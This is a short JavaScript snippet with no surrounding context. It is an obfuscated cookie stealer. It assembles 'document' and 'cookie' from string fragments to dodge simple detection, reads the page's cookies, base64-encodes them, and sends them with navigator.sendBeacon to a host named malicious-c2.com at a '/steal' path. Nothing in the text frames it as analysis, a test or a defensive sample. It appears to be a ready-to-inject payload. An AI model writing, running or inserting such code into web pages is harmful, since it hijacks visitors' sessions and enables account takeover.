let w = this;
let p = 'coo' + 'kie';
let d = w['doc' + 'ument'];
let k = d[p];
let dest = ['ht','tp','s:','//','ma','licious-c2.com/steal?data='].join('');
navigator.sendBeacon(dest + w.btoa(k));
